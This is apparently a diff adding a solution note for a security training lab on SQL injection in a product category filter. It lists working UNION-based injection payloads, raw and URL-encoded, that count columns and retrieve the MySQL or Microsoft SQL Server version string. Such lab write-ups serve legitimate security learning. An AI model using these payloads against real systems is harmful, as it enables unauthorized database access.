@@ -1,0 +1,15 @@
+Lab 4
+----------------------------------------------------------------------------
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+To solve the lab, display the database version string.
+
+
+Solution :
+---------------------------------------------------------------------------
+
+' order by 2#    ( '+order+by+2%23+ )
+' UNION SELECT 'a','a'#      ('+UNION+SELECT+'a','a'%23 )
+' UNION SELECT @@version, NULL#  ('+UNION+SELECT+%40%40version,+NULL%23 )
+
